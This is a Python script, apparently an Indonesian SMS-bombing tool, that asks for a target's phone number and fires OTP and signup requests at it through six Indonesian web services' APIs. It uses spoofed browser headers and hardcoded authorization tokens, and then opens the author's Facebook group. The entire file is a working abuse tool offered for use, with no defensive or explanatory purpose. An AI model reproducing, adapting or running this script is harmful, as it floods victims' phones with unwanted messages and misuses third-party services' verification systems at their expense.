import os, sys, json, base64
from time import sleep as s
try:
    import requests as r
except ModuleNotFoundError:
    os.system('pip install requests')

try:
    from rich.console import Console
except ModuleNotFoundError:
    os.system('pip install rich')

ses = r.Session()
con = Console()
nomor = []
result = []
ua = 'Mozilla/5.0 (Linux; Android 11; SM-A325F Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36 OPX/1.6'
logo = """
[blue_violet]╔═╗[bright_white]┌─┐┌─┐┌┬┐   [blue_violet]╔═╗[bright_white]┌┬┐┌─┐ [bright_red]╭[bright_yellow][[green3]•[bright_yellow]][bright_white] Coded By[blue_violet] :[bright_white] C3ph1r1T
[blue_violet]╚═╗[bright_white]├─┘├─┤│││───[blue_violet]╚═╗[bright_white]│││└─┐ [bright_red]├[bright_yellow][[green3]•[bright_yellow]][bright_white] Fb [blue_violet]:[bright_white] Qerca
[blue_violet]╚═╝[bright_white]┴  ┴ ┴┴ ┴   [blue_violet]╚═╝[bright_white]┴ ┴└─┘ [bright_red]╰[bright_yellow][[green3]•[bright_yellow]][bright_white] Github [blue_violet]:[bright_white] /hekelpro
---------------------------------------------------"""
def getCount():
    api = ses.get('https://api.countapi.xyz/hit/ipan/spammer').json()
    count = api['value']
    return count

def getIp():
    api = ses.get('http://ipwho.is/').json()
    ip = api['ip']
    return ip

def start():
    os.system('clear')
    con.print(logo)
    con.print(f"""[bright_red]╭[blue_violet][[green3]•[blue_violet]][bright_white] Ip Loockup [blue_violet]:[bright_cyan] {getIp()}
[bright_red]├[blue_violet][[green3]•[blue_violet]][bright_white] Count [blue_violet]:[bright_white] {getCount()}
[bright_red]├[blue_violet][[green3]•[blue_violet]][bright_white] Example [blue_violet]:[green3] 8xxxxxx [bright_white]Without[bright_red] 0
[bright_red]│""")
    x = con.input("[bright_red]╰[blue_violet][[green3]•[blue_violet]][bright_white] Nomor Target [blue_violet]: ")
    nomor.append(x)
    eci(); rupaRupa(); sayurbox(); momotor(); momobil(); klikdokter()
    con.print(f"""
[bright_red]╭[blue_violet][[green3]•[blue_violet]][bright_white] Result Message
[bright_red]├[blue_violet][[green3]•[blue_violet]][bright_white] Success [green1]{result.count("success")}[bright_white] Failed[bright_red] {result.count("failed")}[bright_white] C3ph1r1T Khunnnn
[bright_red]╰[blue_violet][[green3]•[blue_violet]][bright_white] Join Grub [bright_yellow]https://fb.com/groups/912488126397893/
    """)
    os.system('xdg-open https://facebook.com/groups/912488126397893/')

def eci():
    dt = json.dumps({"identity":f"0{nomor[0]}","with":"sms"})
    hd = {'Host': 'eci.id','Accept': 'application/json, text/plain, */*','Content-Type': 'application/json','Accept': 'application/json, text/plain, */*','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent':''+ua}
    main = ses.post('https://eci.id/api/signup', headers=hd, data=dt)
    if "success" in main.text:
    	result.append('success')
    else:
    	result.append('failed')

def rupaRupa():
    dt = json.dumps({"phone":f"0{nomor[0]}","action":"register","channel":"message","email":"","token":0,"customer_id":"0","is_resend":0})
    hd = {'Host': 'wapi.ruparupa.com','authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiNmQwODgxMTEtMzBkYy00NzJmLTkyMGItZTU0MDJkZDlkMTYyIiwiaWF0IjoxNjY2ODc0MTk2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.m3DThsLE62zkPMIEJGH8GI6uubJe5h4VD80ksEdCIx4','user-agent': ''+ua,'content-type': 'application/json','x-company-name': 'odi','accept': 'application/json','informa-b2b': 'false','origin': 'https://www.ruparupa.com','referer': 'https://www.ruparupa.com/verification?page=otp-choices'}
    main = ses.post('https://wapi.ruparupa.com/auth/generate-otp', headers=hd, data=dt)
    if "success" in main.text:
        result.append('success')
    else:
        result.append('failed')

def sayurbox():
    hd = {'Host': 'www.sayurbox.com','authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY1Nzg3NzgzLCJleHAiOjE2NjgzNzk3ODMsImlhdCI6MTY2NTc4Nzc4MywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc4YTA4NDFiLTFkNWUtNDU3OS1iZjQ4LWM0ODMzNTcxZDA2NSIsInN1YiI6Ik9ubnFTbVNtczFrRkZJQklHWWNCUl9ZWWFqc28iLCJ1c2VyX2lkIjoiT25ucVNtU21zMWtGRklCSUdZY0JSX1lZYWpzbyJ9.L9Gsl3FcDDHvXyYjpgHNwUZ6FL0PzLRIWDUp9gtpbb-g1j1EyUkf5K-pZwiT2Sybc93N8UX1lDh-A3c9gpjn-1p1xtfAYwwcqn_u5f9z-ed6yzR_9NQmmnWJxTym-3FU7qfY2NlaIEnTeYUNV7Jdk_DxbQLZ78ztvk-AXlVHqWMB1x-tXlDa85PdIi8eXOoprCkUGBfY26yQ3jltQgwz_QL0-LLEClYqy_D57CZNXOBnBgrqccjDbZYlXLkIjC9-cjhQLgFl-5HyBFNScOVQzfnICRTdTU6yeo993zEZ2rmhTWAzgknP8fH1hC6dw7T6wEL1O7_aqF5N-sTlQio23Q','content-type': 'application/json','origin': 'https://www.sayurbox.com','user-agent':''+ua}
    dt = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"sms","identity":f"+62{nomor[0]}"},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
    main = ses.post('https://www.sayurbox.com/graphql/v1?deduplicate=1', headers=hd, data=dt)
    if "AuthIDResponseType" in main.text:
        result.append('success')
    else:
        result.append('failed')

def momotor():
    sample_string = f"0{nomor[0]}-M0M0T0RK3Y"
    sample_string_bytes = sample_string.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    hd = {'Host': 'api.momotor.id','accept': '*/*','content-type': 'application/json','user-agent': ''+ua,'origin': 'https://momotor.id','referer': 'https://momotor.id/'}
    dt = json.dumps({"to":f"{base64_string}"})
    main = ses.post('https://api.momotor.id/users/motor/send-otp', headers=hd, data=dt)
    if "pinId" in main.text:
        result.append('success')
    else:
        result.append('failed')    			
    		
def momobil():
    hd = {'User-Agent': ''+ua,'Content-Type': 'application/json','Accept': '*/*','Origin': 'https://momobil.id'}
    dt = json.dumps({"to":f"0{nomor[0]}","type":"register"})
    main = ses.post('https://api.momobil.id/users/otp/send', headers=hd, data=dt)
    if "MESSAGE_SENT" in main.text:
        result.append('success')
    else:
        result.append('failed')

def klikdokter():
    dt = json.dumps({"phone":f"62{nomor[0]}"})
    hd = {'Host': 'api.medkomtek.com','accept': 'application/json','x-api-platform': 'eyJhcHBfdmVyc2lvbiI6IjIuMC4wIiwicGxhdGZvcm0iOiJ3ZWIiLCJtYW51ZmFjdHVyZXIiOiJCbGluayIsInByb2R1Y3QiOiJ2aXZvIDE4MjAiLCJkZXNjcmlwdGlvbiI6IkNocm9tZSBNb2JpbGUgMTA2LjAuMC4wIG9uIHZpdm8gMTgyMCAoQW5kcm9pZCA4LjEuMCkifQ==','content-type': 'application/json','user-agent':''+ua}
    main = ses.post('https://api.medkomtek.com/v2/publishing/users/check', headers=hd, data=dt)
    if "Success" in main.text:
        result.append('success')
    else:
        result.append('failed')
    			


if __name__=='__main__':
    start()
    
